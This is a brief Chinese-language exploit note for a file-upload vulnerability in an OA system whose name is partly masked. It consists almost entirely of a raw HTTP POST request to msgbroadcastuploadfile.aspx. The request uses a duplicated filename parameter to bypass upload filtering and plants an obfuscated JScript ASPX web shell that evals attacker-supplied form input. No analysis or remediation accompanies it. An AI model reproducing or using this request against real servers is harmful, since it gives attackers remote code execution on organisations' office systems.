## 某联达oa 后台文件上传漏洞
```
POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 10.10.10.1:8888
X-Requested-With: Ext.basex
Accept: text/html, application/xhtml+xml, image/jxr, /
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Accept: /
Origin: http://10.10.10.1
Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40
Cookie: 
Connection: close
Content-Length: 421

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

<%@ Page Language="Jscript" Debug=true%>
<%
var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';
var GFMA=Request.Form("qmq1");
var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
eval(GFMA, ONOQ);
%>

------WebKitFormBoundaryFfJZ4PlAZBixjELj--

```
